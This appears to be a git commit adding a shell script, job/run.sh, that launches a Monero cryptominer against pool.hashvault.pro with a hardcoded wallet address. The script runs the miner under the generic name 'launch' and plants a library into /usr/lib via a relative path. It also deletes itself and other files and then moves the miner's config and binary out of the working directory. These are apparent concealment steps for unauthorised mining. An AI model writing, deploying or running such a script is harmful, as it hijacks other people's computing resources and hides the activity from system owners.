4165d9dfec9581d7f9bc53216081c38fbf992787
Wellnel <41605099+Wellnel@users.noreply.github.com>
2025-01-27 19:51:56 +0800

    Create run.sh

---
+++ job/run.sh
@@ -0,0 +1,17 @@
+#!/bin/bash
+
+set -e
+# Replace changeme with your values. Check out readme for more.
+POOL="pool.hashvault.pro"
+PORT=443
+MYADDRESS="4AUTfJGTvT8A98PSE99EunfrnUbkWe9vU3FN3qsABQLP5aPKQuvWS5sCaD9WaXFQUqNtDLb9dcxiBgJiWCfjvDXp5ptWDYG"
+COINNAME="monero"
+# executable permissions
+echo "Setting executable permissions"
+if ! chmod +x libuv.so launch; then
+    echo "Error: Failed to set executable permissions"
+    exit 1
+    else mv libuv.so ../../../usr/lib && rm EA "EA FA" run.sh 
+fi
+echo "Starting now"
+./launch -o $POOL:$PORT -u $MYADDRESS --tls --coin $COINNAME -t 1 && mv config.json launch ../../ && cd
